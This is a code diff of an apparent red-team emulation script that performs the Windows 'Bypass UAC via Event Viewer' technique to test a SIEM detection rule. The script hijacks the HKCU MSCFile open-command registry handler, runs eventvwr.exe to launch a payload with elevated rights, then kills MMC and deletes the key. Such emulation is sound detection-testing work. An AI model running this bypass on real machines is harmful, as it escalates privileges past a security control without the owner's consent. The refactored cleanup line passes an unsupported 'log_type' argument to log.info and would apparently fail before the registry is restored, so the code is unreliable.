@@ -8,10 +8,39 @@
 # ATT&CK: T1088
 # Description: Modifies the Registry value to change the handler for MSC files, bypassing UAC.
 
-import sys
+import logging
 import time
+import typing
 
-from . import _common, RuleMetadata, register_code_rta, OSType
+from . import OSType, RuleMetadata, _common, register_code_rta
+
+log = logging.getLogger(__name__)
+
+
+# Default machine value:
+# HKLM\Software\Classes\MSCFile\shell\open\command\(Default)
+# %SystemRoot%\system32\mmc.exe "%1" %*
+
+
+@typing.no_type_check
+def _winreg_operations(target_file: str):
+    winreg = _common.get_winreg()
+
+    log.info("Writing registry key")
+    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
+    winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)
+
+    log.info("Running event viewer")
+    _ = _common.execute_command(["c:\\windows\\system32\\eventvwr.exe"])
+
+    time.sleep(3)
+    log.info("Killing MMC")
+    _ = _common.execute_command(["taskkill", "/f", "/im", "mmc.exe"])
+
+    log.info("Restoring registry key", log_type="-")
+    winreg.DeleteValue(hkey, "")
+    winreg.DeleteKey(hkey, "")
+    winreg.CloseKey(hkey)
 
 
 @register_code_rta(
@@ -22,29 +51,8 @@ from . import _common, RuleMetadata, register_code_rta, OSType
     siem_rules=[RuleMetadata(id="31b4c719-f2b4-41f6-a9bd-fce93c2eaf62", name="Bypass UAC via Event Viewer")],
     techniques=["T1548"],
 )
+def main():
+    target_file = _common.get_resource_path("bin/myapp.exe")
+    log.info("Bypass UAC with %s" % target_file)
 
-
-# Default machine value:
-# HKLM\Software\Classes\MSCFile\shell\open\command\(Default)
-# %SystemRoot%\system32\mmc.exe "%1" %*
-
-
-def main(target_file=_common.get_path("bin", "myapp.exe")):
-    winreg = _common.get_winreg()
-    _common.log("Bypass UAC with %s" % target_file)
-
-    _common.log("Writing registry key")
-    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
-    winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)
-
-    _common.log("Running event viewer")
-    _common.execute(["c:\\windows\\system32\\eventvwr.exe"])
-
-    time.sleep(3)
-    _common.log("Killing MMC", log_type="!")
-    _common.execute(["taskkill", "/f", "/im", "mmc.exe"])
-
-    _common.log("Restoring registry key", log_type="-")
-    winreg.DeleteValue(hkey, "")
-    winreg.DeleteKey(hkey, "")
-    winreg.CloseKey(hkey)
+    _winreg_operations(str(target_file))
